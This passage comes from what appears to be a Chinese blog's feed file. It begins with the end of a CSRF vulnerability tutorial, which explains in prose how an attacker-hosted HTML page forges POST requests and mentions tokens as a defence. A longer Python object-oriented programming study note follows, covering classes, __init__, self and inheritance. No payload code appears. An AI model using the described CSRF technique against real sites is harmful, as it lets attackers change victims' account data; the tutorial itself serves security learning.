title="八、CSRF（post）"></a>八、CSRF（post）</h1><p>post型的，所有参数在请求体中提交，我们不能通过伪造URL的方式进行攻击，这里的攻击方式需要攻击者自己写个利用该漏洞的html文件，放在自己服务器上，并发给用户请求这个html文件的链接，当用户点击时，就会自动向存在CSRF的服务器提交POST请求，修改个人信息。<br>#九、CSRF Token<br>CSRF的主要问题是敏感操作容易被伪造，我们可以加入Token让请求不容易被伪造。<br>#十、防御措施<br><img src="http://120.48.107.243:9090/blog/2023/04/01/53d82878be164ddbb3e656bfbb8be769.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> CSRF漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> CSRF漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（十六）</title>
      <link href="/2022/07/20/python_sixteen/"/>
      <url>/2022/07/20/python_sixteen/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403140126896.png" alt="在这里插入图片描述"><br>本篇文章记录的是Python面向对象的知识。</p><h1 id="一、什么是面向对象"><a href="#一、什么是面向对象" class="headerlink" title="一、什么是面向对象"></a>一、什么是面向对象</h1><p>面向对象编程是一种编程思想 , 一种编程范式 , 不是只有python才有 , 而是所有的编程语言都可以用面向对象的思想去写代码 , 那么面向对象到底是什么 ?</p><p><code>面向对象</code>的核心是<code>对象</code>二字，而<code>对象的精髓在于整合</code>，什么意思？</p><p>所有的程序(脚本) 都是由 “数据” ( 变量 ) 与 “功能”(函数) 组成，因而<strong>编写程序的本质就是定义出一系列的数据，然后再定义出一系列的功能来对数据进行操作</strong>。</p><p>示例</p><p>一个游戏中一个用户 , 每天的打卡代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;小王&quot;</span></span><br><span class="line">age = <span class="number">21</span></span><br><span class="line">addr = <span class="string">&quot;信思智学&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">da_ka</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;age&#125;</span>的<span class="subst">&#123;name&#125;</span>,每天都要去<span class="subst">&#123;addr&#125;</span>上班,打卡&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;打卡成功&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">da_ka()</span><br></pre></td></tr></table></figure><p>上述代码是不是有数据 有功能 , 整个程序抽象成网络游戏中的一个用户每天必须要做的事情 , 那如果有一个新注册的用户小李 , 是不是每天也要做这样的事情 , 程序背后的代码是不是还是这几行 ? 只不过数据的值可能要变</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;小李&quot;</span></span><br><span class="line">age = <span class="number">22</span></span><br><span class="line">addr = <span class="string">&quot;信思智学&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">da_ka</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;age&#125;</span>的<span class="subst">&#123;name&#125;</span>,每天都要去<span class="subst">&#123;addr&#125;</span>上班,打卡&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;打卡成功&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">da_ka()</span><br></pre></td></tr></table></figure><h1 id="二、为什么要有面向对象"><a href="#二、为什么要有面向对象" class="headerlink" title="二、为什么要有面向对象"></a>二、为什么要有面向对象</h1><p>如果当前这个游戏 背后所有用户的打卡代码都这样 , 是不是非常的冗余 , 既然都是用户 , 那么都会有三个变量要创建对吧 , 我们把这三个变量称之为<strong>属性</strong> ,  以及一个打卡函数 , 我们称之为<strong>功能</strong>  , 我们能不能把这些属性和功能封装到一个类似像函数那样的代码中 , 我们只需要传入不同的值就可以实现这样的打卡功能了</p><p>可以的 , 面向对象编程就可以实现 , 把公有的一些属性和方法 , 封装到一个<strong>类中</strong> , 然后通过类实例化出不同的对象这个不同取决于我们在实例化对象时候传入的值是不同的 , 所以实例化出的对象也是不同的 , 然后通过对象去调用打卡功能 , 那在python中如何编写这样的代码呢?</p><h1 id="三、面向对象的代码如何编写"><a href="#三、面向对象的代码如何编写" class="headerlink" title="三、面向对象的代码如何编写"></a>三、面向对象的代码如何编写</h1><h2 id="1、类的定义"><a href="#1、类的定义" class="headerlink" title="1、类的定义"></a>1、类的定义</h2><p>语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">类名</span>:</span><br><span class="line">    类中的代码</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 关于类名的定义规范和变量很相似 , 只不过它的首字母要大写 , 多个单词组成的话 , 推荐使用驼峰法</span></span><br></pre></td></tr></table></figure><p>其中解释器运行到类定义代码的时候 , 就会被执行 , 不像函数 , 函数里的代码只有当调用时才会被执行 </p><p>示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class A:</span><br><span class="line">    print(&quot;111&quot;)</span><br></pre></td></tr></table></figure><h2 id="2、实例化对象"><a href="#2、实例化对象" class="headerlink" title="2、实例化对象"></a>2、实例化对象</h2><p>关于类中的代码 , 如何设计 , 怎么写 , 我们以上面的那个例子为例</p><p>第一版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="comment"># 相同的属性</span></span><br><span class="line">    addr = <span class="string">&quot;信思智学&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 公有的方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">da_ka</span>(<span class="params">self, age, name, addr</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;age&#125;</span>的<span class="subst">&#123;name&#125;</span>,每天都要去<span class="subst">&#123;addr&#125;</span>上班,打卡&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;打卡成功&quot;</span>)</span><br></pre></td></tr></table></figure><p>先看如何通过类实例化出来对象 <strong>实例化对象</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="comment"># 类名()</span></span><br><span class="line">obj1 = User()</span><br><span class="line">obj2 = User()</span><br><span class="line">obj3 = User()</span><br></pre></td></tr></table></figure><h2 id="3、属性的访问"><a href="#3、属性的访问" class="headerlink" title="3、属性的访问"></a>3、属性的访问</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="comment"># 对象.属性</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(obj1.addr)</span><br><span class="line"><span class="built_in">print</span>(obj2.addr)</span><br><span class="line"><span class="built_in">print</span>(obj3.addr)</span><br></pre></td></tr></table></figure><h2 id="4、新增属性"><a href="#4、新增属性" class="headerlink" title="4、新增属性"></a>4、新增属性</h2><p>即为对象定制自己独有的属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line">对象.属性 = 值</span><br><span class="line"></span><br><span class="line">obj1.name = <span class="string">&quot;小王&quot;</span></span><br><span class="line">obj1.age = <span class="number">21</span></span><br><span class="line"></span><br><span class="line">obj2.name = <span class="string">&quot;小李&quot;</span></span><br><span class="line">obj2.age = <span class="number">22</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(obj1.name)</span><br><span class="line"><span class="built_in">print</span>(obj2.name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 补充</span></span><br><span class="line">如果属性存在会修改当前对象的属性值 , 其他对象还是原来的属性值</span><br></pre></td></tr></table></figure><h2 id="5、方法的访问"><a href="#5、方法的访问" class="headerlink" title="5、方法的访问"></a>5、方法的访问</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="comment"># 对象.方法()</span></span><br><span class="line"></span><br><span class="line">obj1.da_ka(obj1.name,obj1.age,obj1.addr)</span><br></pre></td></tr></table></figure><h2 id="6、初始化方法"><a href="#6、初始化方法" class="headerlink" title="6、初始化方法"></a>6、初始化方法</h2><p>如果我的程序 , 现在要再创建3个对象 , 并且还要新增自己独有的属性值 , 那么这样的代码是不是还要写3遍</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj2.name = <span class="string">&quot;小强&quot;</span></span><br><span class="line">obj2.age = <span class="number">23</span></span><br><span class="line"></span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>代码是不是很重复 冗余 , 既然重复 冗余我们能不能封装成一个函数 , 每次想新增属性 , 只需要调用函数 , 然后传递不同的参数即可</p><p>第二版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="comment"># 相同的属性</span></span><br><span class="line">    addr = <span class="string">&quot;信思智学&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 公有的方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">da_ka</span>(<span class="params">self, age, name, addr</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;age&#125;</span>的<span class="subst">&#123;name&#125;</span>,每天都要去<span class="subst">&#123;addr&#125;</span>上班,打卡&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;打卡成功&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">obj,name,age</span>):</span><br><span class="line">    obj.name = name</span><br><span class="line">    obj.age = age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj3 = User()</span><br><span class="line">obj4 = User()</span><br><span class="line">obj5 = User()</span><br><span class="line"></span><br><span class="line">init(obj3,<span class="string">&quot;小强&quot;</span>,<span class="number">23</span>)</span><br><span class="line">init(obj4,<span class="string">&quot;小刚&quot;</span>,<span class="number">24</span>)</span><br><span class="line">init(obj5,<span class="string">&quot;小呆呆&quot;</span>,<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(obj3.name)</span><br></pre></td></tr></table></figure><p>既然这个init函数 , 是所有对象都要调用的函数 , 我们能不能把它想da_ka这样的功能一下 , 是公有的 , 我们写的类里面呢 ? 是可以的</p><p>第三版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="comment"># 相同的属性</span></span><br><span class="line">    addr = <span class="string">&quot;信思智学&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 公有的方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">da_ka</span>(<span class="params">self, age, name, addr</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;age&#125;</span>的<span class="subst">&#123;name&#125;</span>,每天都要去<span class="subst">&#123;addr&#125;</span>上班,打卡&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;打卡成功&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj3 = User(<span class="string">&quot;小强&quot;</span>, <span class="number">23</span>)</span><br><span class="line">obj4 = User(<span class="string">&quot;小刚&quot;</span>, <span class="number">24</span>)</span><br><span class="line">obj5 = User(<span class="string">&quot;小呆呆&quot;</span>, <span class="number">25</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(obj3.name)</span><br><span class="line"><span class="built_in">print</span>(obj4.name)</span><br><span class="line"><span class="built_in">print</span>(obj5.name)</span><br></pre></td></tr></table></figure><p>实际上 python 提供的有专门的方法 , 就是 <code>__init__</code> , 它称之为 <strong>初始化方法</strong> , <strong>当实例化对象的时候会自动的调用</strong> ,该方法是有着固定的作用 , 就是用来封装对象之间不同的一些属性值 , 如 人对象 , 每个人都有名字这个属性, 但是名字的值都是不同的</p><p>补充</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在这类以__开始和__结束的方法 , 有的从php转来的程序员 也叫他魔术方法/魔法函数 等等</span><br></pre></td></tr></table></figure><h2 id="7、self"><a href="#7、self" class="headerlink" title="7、self"></a>7、self</h2><p>self是什么呢 ? 它实际上是当前属性&#x2F;方法的调用者 , 即当前对象 , 我们通过print ,打印他们的内存地址 , 即可发现</p><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="comment"># 相同的属性</span></span><br><span class="line">    addr = <span class="string">&quot;信思智学&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 公有的方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">da_ka</span>(<span class="params">self, age, name, addr</span>):</span><br><span class="line">        <span class="built_in">print</span>(self)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;age&#125;</span>的<span class="subst">&#123;name&#125;</span>,每天都要去<span class="subst">&#123;addr&#125;</span>上班,打卡&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;打卡成功&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj3 = User(<span class="string">&quot;小强&quot;</span>, <span class="number">23</span>)</span><br><span class="line">obj4 = User(<span class="string">&quot;小刚&quot;</span>, <span class="number">24</span>)</span><br><span class="line">obj5 = User(<span class="string">&quot;小呆呆&quot;</span>, <span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">obj3.da_ka(obj3.age,obj3.name,obj3.addr)</span><br><span class="line"><span class="built_in">print</span>(obj3)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;__main__.User object at 0x000001F5583A27F0&gt;</span></span><br><span class="line"><span class="string">23的小强,每天都要去信思智学上班,打卡</span></span><br><span class="line"><span class="string">打卡成功</span></span><br><span class="line"><span class="string">&lt;__main__.User object at 0x000001F5583A27F0&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>既然self是当前调用的对象 , 当前对象中又封装的有da_ka函数需要使用到的变量 , 那么 da_ka 中代码我可以这样修改</p><p>第四版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="comment"># 相同的属性</span></span><br><span class="line">    addr = <span class="string">&quot;信思智学&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 公有的方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">da_ka</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.age&#125;</span>的<span class="subst">&#123;self.name&#125;</span>,每天都要去<span class="subst">&#123;self.addr&#125;</span>上班,打卡&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;打卡成功&quot;</span>)</span><br><span class="line"></span><br><span class="line">obj3 = User(<span class="string">&quot;小强&quot;</span>, <span class="number">23</span>)</span><br><span class="line">obj4 = User(<span class="string">&quot;小刚&quot;</span>, <span class="number">24</span>)</span><br><span class="line">obj5 = User(<span class="string">&quot;小呆呆&quot;</span>, <span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">obj3.da_ka()</span><br></pre></td></tr></table></figure><h1 id="四、面向对象的三大特征"><a href="#四、面向对象的三大特征" class="headerlink" title="四、面向对象的三大特征"></a>四、面向对象的三大特征</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">封装 : 找到变化并且把它封装起来 , 你就可以在不影响其它部分的情况下修改或扩展被封装的变化部分 , 这是所有设计模式的基础 , 就是封装变化 , 因此封装的作用 , 就解决了程序的可扩展性。</span><br><span class="line"></span><br><span class="line">继承 : 子类继承父类 , 可以继承父类的方法及属性 , 实现了多态以及代码的重用 , 因此也解决了系统的重用性和扩展性 </span><br><span class="line"></span><br><span class="line">多态 : 接口的多种不同的实现方式即为多态。接口是对行为的抽象 , 刚才在封装提到 , 找到变化部分并封装起来,但是封装起来后 , 怎么适应接下来的变化?这正是接口的作用 , 接口的主要目的是为不相关的类提供通用的处理服务,我们可以想象一下。比如鸟会飞 , 但是超人也会飞 , 通过飞这个接口 , 我们可以让鸟和</span><br><span class="line">超人 , 都实现这个接口 , 这就实现了系统的可维护性,可扩展性。</span><br><span class="line"></span><br><span class="line">因此面向对象能实现人们追求的系统可维护性 , 可扩展性 , 可重用性。面向对象是一种编程思想 , 起初,“面向对象”是专指在程序设计中采用封装、继承、多态等设计方法,但面向对象的思想已经涉及到软件开发的各个方面,比如现在细分为了面向对象的分析(OOA),面向对象的设计(OOD),面向对象的编程实现(OOP)</span><br></pre></td></tr></table></figure><h2 id="1、封装"><a href="#1、封装" class="headerlink" title="1、封装"></a>1、封装</h2><p>还是针对上面的代码 , 比如我还想 封装 一个每天晚上要去查人数的功能 , 我就可以这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="comment"># 相同的属性</span></span><br><span class="line">    addr = <span class="string">&quot;信思智学&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 公有的方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">da_ka</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.age&#125;</span>的<span class="subst">&#123;self.name&#125;</span>,每天都要去<span class="subst">&#123;self.addr&#125;</span>上班,打卡&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;打卡成功&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kao_qin</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;亲爱的<span class="subst">&#123;self.name&#125;</span>同学,每天晚上19.00都要去查考勤&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;查考勤结束&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj3 = User(<span class="string">&quot;小强&quot;</span>, <span class="number">23</span>)</span><br><span class="line">obj4 = User(<span class="string">&quot;小刚&quot;</span>, <span class="number">24</span>)</span><br><span class="line">obj5 = User(<span class="string">&quot;小呆呆&quot;</span>, <span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">obj3.da_ka()</span><br><span class="line">obj3.kao_qin()</span><br></pre></td></tr></table></figure><p>说简单点 , 就是把函数写到类里面 , 当然关于封装不仅仅只是这一点点而已 , 还有其他的封装</p><h2 id="2、继承"><a href="#2、继承" class="headerlink" title="2、继承"></a>2、继承</h2><p><strong>什么是继承</strong></p><p>继承是一种创建新类的方式，在Python中，新建的类可以继承一个或多个父类，新建的类可称为子类或派生类，父类又可称为基类或超类</p><p><strong>继承语法</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">类名</span>(父类<span class="number">1</span>,父类<span class="number">2</span>):</span><br><span class="line">pas</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent1</span>:</span><br><span class="line">    x = <span class="number">11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parent2</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub1</span>(<span class="title class_ inherited__">Parent1</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub2</span>(Parent1, Parent2):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><strong>为什么要继承以及继承的意义</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">为什么要用继承</span><br><span class="line">解决类与类之间代码冗余问题</span><br><span class="line"></span><br><span class="line">继承的意义</span><br><span class="line">子类会遗传父类的属性 , 解决类与类之间代码冗余问题</span><br></pre></td></tr></table></figure><p><strong>继承下的属性查找顺序</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f1</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;foo.f1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f2</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;foo.f2&quot;</span>)</span><br><span class="line">        self.f1()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bar</span>(<span class="title class_ inherited__">Foo</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f1</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bar.f1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b = Bar()</span><br><span class="line">b.f2()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只要涉及到继承找属性,一定要先从当前对象查找,没有,再到类中查找,如果在没有再到父类中查找</span></span><br></pre></td></tr></table></figure><p>补充 : 父类如果不想让子类覆盖自己的方法，可以采用双下划线开头的方式将方法设置为私有的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">     <span class="keyword">def</span> <span class="title function_">__f1</span>(<span class="params">self</span>): <span class="comment"># 变形为_Foo__fa</span></span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&#x27;Foo.f1&#x27;</span>) </span><br><span class="line">     <span class="keyword">def</span> <span class="title function_">f2</span>(<span class="params">self</span>):</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&#x27;Foo.f2&#x27;</span>)</span><br><span class="line">        self.__f1() <span class="comment"># 变形为self._Foo__fa,因而只会调用自己所在的类中的方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bar</span>(<span class="title class_ inherited__">Foo</span>):</span><br><span class="line">     <span class="keyword">def</span> <span class="title function_">__f1</span>(<span class="params">self</span>): <span class="comment"># 变形为_Bar__f1</span></span><br><span class="line">        <span class="built_in">print</span>(<span 